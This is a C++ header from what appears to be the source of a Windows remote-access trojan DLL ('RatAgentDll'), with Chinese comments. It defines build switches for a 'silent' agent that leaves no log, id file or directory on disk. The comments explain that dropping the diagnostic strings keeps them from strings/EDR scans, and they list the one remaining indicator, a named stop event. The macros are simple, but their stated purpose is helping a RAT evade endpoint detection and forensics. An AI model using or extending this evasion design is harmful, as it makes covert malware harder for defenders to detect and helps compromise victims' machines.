// agent_debug.h — Agent 诊断输出 / 落盘行为的编译期开关
//
// 目的：能出一个"静默版"Agent —— 不打印任何诊断信息、不在磁盘上留任何文件
//（不写 agent.log、不写 agent.id、不建目录），把可观测面压到最小。
//
// 两个宏（都可被 MSBuild 属性覆盖，见文件末尾的构建示例）：
//
//   RAT_AGENT_DEBUG        诊断输出总开关（默认 1）
//     1 → AGENT_LOG(...) 展开为 printf(...)：诊断走 stdout（DLL 无控制台时由
//         agent_redirect_stdout 落 agent.log）
//     0 → AGENT_LOG(...) 展开为空操作。**格式串不会被编进二进制**——这比"把 printf
//         重定向到 NUL"更干净：后者字符串仍在镜像里，strings/EDR 一扫就能看到。
//
//   RAT_AGENT_PERSIST_ID   agent.id 是否落盘（默认跟随 RAT_AGENT_DEBUG）
//     1 → 读/写 id 文件：身份跨进程重启稳定 → 重连同 id、另一进程可凭 id 文件停止
//     0 → 身份只在内存里（每次启动随机），磁盘零写入。
//         代价：重启后 id 变化；另一进程无法凭 id 文件停止它（仍可按已知的
//         32 位 hex 触发命名事件）
//
// 仍然会创建的内核对象（不是磁盘 IOC）：跨进程停止用的命名事件
// `Local\RatAgentStop.<agent_id_hex>`（见 agent_runtime.cpp）。
//
// 构建示例（默认 1/1，行为与以前完全一致）：
//   :: 常规（有诊断、有 id 文件）
//   MSBuild client\RatAgentDll.vcxproj -p:Configuration=Release -p:Platform=x64 ...
//   :: 静默（无输出、无文件）
//   MSBuild client\RatAgentDll.vcxproj -p:Configuration=Release -p:Platform=x64 -p:RatAgentDebug=0 ...
//   :: 静默但保留稳定身份（只落 id 文件，不打印、不落日志）
//   MSBuild ... -p:RatAgentDebug=0 -p:RatAgentPersistId=1 ...
#pragma once

#include <cstdio>

// 直接编译（不走 MSBuild 属性）时的默认值：保持既有行为
#ifndef RAT_AGENT_DEBUG
#define RAT_AGENT_DEBUG 1
#endif

#ifndef RAT_AGENT_PERSIST_ID
#define RAT_AGENT_PERSIST_ID RAT_AGENT_DEBUG
#endif

// 诊断输出宏：静默构建下连参数都不求值（编译期整体消失）
#if RAT_AGENT_DEBUG
#define AGENT_LOG(...) printf(__VA_ARGS__)
#else
#define AGENT_LOG(...) ((void)0)
#endif
